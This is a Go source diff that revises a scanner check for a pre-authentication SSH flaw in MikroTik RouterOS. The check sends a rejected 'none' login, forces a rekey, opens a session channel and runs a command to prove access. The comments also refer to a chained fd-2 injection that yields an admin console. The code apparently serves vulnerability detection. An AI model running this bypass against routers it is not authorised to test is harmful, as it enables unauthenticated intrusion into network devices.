@@ -19,10 +19,11 @@ const checkVulnMikrotikPreauthRekey = "vuln-mikrotik-preauth-rekey"
 // unauthenticated client can open a session channel (and dispatch exec
 // requests) without any credentials. Fixed in 7.24.2 / 7.23.4 / 6.49.21.
 //
-// This check needs no credentials and no victim key material: it requests a
-// rekey immediately after the initial key exchange, skips the userauth
-// service entirely, and tries to open a session channel. A patched server
-// (and any sane sshd) refuses the channel; a vulnerable RouterOS accepts it.
+// This check needs no credentials and no victim key material: it presents
+// 'none' authentication (which RouterOS rejects, leaving the username pending
+// in an incomplete userauth state), requests a rekey, and then tries to open
+// a session channel. A patched server (and any sane sshd) refuses the channel;
+// a vulnerable RouterOS accepts it.
 //
 // https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/
 
@@ -36,7 +37,7 @@ func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *au
 
 	run := func(rekey bool) *auth.AuthResult {
 		o := options.
-			WithSkipStages("ssh-userauth", "auth").
+			WithIgnoreAuthError().
 			WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
 				_ = c.SetDeadline(time.Now().Add(time.Second * 15))
 				out, err := ses.CombinedOutput("/system resource print")
@@ -52,9 +53,10 @@ func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *au
 				return nil
 			})
 		if rekey {
-			// Trigger a client-requested rekey while still unauthenticated.
-			// Packets written afterwards (the channel open) are queued by the
-			// transport and flushed once the rekey completes.
+			// Trigger a client-requested rekey while the rejected "none" auth
+			// leaves the username pending (incomplete userauth state). Packets
+			// written afterwards (the channel open) are queued by the transport
+			// and flushed once the rekey completes.
 			o = o.WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
 				if err := uac.RequestKeyExchange(); err != nil {
 					conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
@@ -64,8 +66,8 @@ func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *au
 				return nil
 			})
 		}
-		// ssh.None() is never reached (the auth stage is skipped); it only
-		// satisfies the SSHAuth signature.
+		// ssh.None() is rejected as expected; IgnoreAuthError keeps the
+		// connection open so the rekey + channel open follow.
 		return auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
 	}
 
@@ -111,10 +113,12 @@ func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *au
 		Proof: proof,
 	})
 
-	res.SessionMethod = tname
-	root.SessionMethod = tname
+	// Report the CVE but do not claim a usable session: the channel open alone
+	// (CVE-2026-67279) yields no console, so interacting via this method would
+	// fail and, worse, would short-circuit the scan before the fd-2 injection
+	// check (CVE-2026-86060) can obtain the actual admin console.
+	res.SessionMethod = ""
 	root.SessionOutput = res.SessionOutput
-	root.ExitStatus = res.ExitStatus
 
 	return res
 }
